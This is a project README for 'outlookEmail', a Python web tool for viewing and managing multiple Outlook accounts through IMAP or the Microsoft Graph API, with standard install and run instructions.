# 📧 outlookEmail - Manage Your Outlook Emails Easily

[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/EddyClover009/outlookEmail/releases)

## 📝 Overview

outlookEmail is a complete solution for managing your Outlook emails. It allows you to access your email inbox and manage your accounts through a straightforward web interface.

## ✨ Features

### 📫 Email Access Methods

You can read your Outlook emails using three methods:

1. **Old IMAP Method** - Connect via `outlook.office365.com`
2. **New IMAP Method** - Connect via `outlook.live.com`
3. **Graph API Method** - Use Microsoft Graph API for secure access

### 🌐 Web Application Functions

- 🔐 **Login Protection** - Secure web interface
- 📁 **Group Management** - Create, edit, delete email groups
- 📧 **Multiple Account Support** - Import and manage several Outlook accounts at once
- 📬 **Email Viewing** - View a list of emails and their details
- 📤 **Export Functionality** - Export account information by group
- 🎨 **Modern UI** - Clean four-column layout for easy navigation
- ⚡ **Performance Enhancement** - Faster access with email list caching
- 🔥 **Temporary Email Creation** - Generate a temporary email using GPTMail API
- ⚙️ **System Settings** - Change login password and API Key online

### 📊 Interface Layout

The web application features a four-column layout:

1. **Group Panel** - Lists all your email groups
2. **Email Panel** - Displays accounts within the selected group
3. **Email List** - Shows inbox emails of the selected account
4. **Email Details** - Displays complete content of the selected email

## 📋 System Requirements

- Python 3.8 or higher
- Internet access to connect to Microsoft services

## 🚀 Getting Started

### 1. Visit the Releases Page

To download the latest version of outlookEmail, visit the following link:

[Download OutlookEmail](https://github.com/EddyClover009/outlookEmail/releases)

### 2. Install Dependencies

After downloading, open your command line interface (CLI) and run this command:

```bash
pip install -r requirements.txt
```

### 3. Run the Web Application

Start the web application with the command:

```bash
python web_outlook_app.py
```

Once it's running, access it in your web browser:

http://127.0.0.1:5001

The default login password is `admin123`. You can change this in the settings of the web interface.

### 4. Run the Command-Line Test Tool

You can also run the command-line email reader with:

```bash
python outlook_mail_reader.py
```

## 📥 Download & Install

To download the latest version of outlookEmail, go to the [Releases page](https://github.com/EddyClover009/outlookEmail/releases) and choose the appropriate file for your system. Follow the instructions above to install and get started.